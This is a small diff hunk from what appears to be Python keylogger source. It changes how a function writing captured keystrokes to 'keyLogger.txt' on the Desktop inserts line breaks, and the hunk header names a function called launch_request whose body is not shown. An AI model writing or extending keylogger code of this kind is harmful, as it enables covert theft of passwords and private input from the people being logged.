@@ -24,7 +24,7 @@ def launch_request(key):
 
 def write_to_file(key):
     with open(file=f"{path}{os.path.sep}Desktop{os.path.sep}keyLogger.txt", mode="a+") as f:
-        if int(f.tell()) % 50 == 0 and int(f.tell()) > 0:
+        if int(f.tell()) % 250 == 0 and int(f.tell()) != 0:
             f.write("\n")
 
         if "{del}" in key:
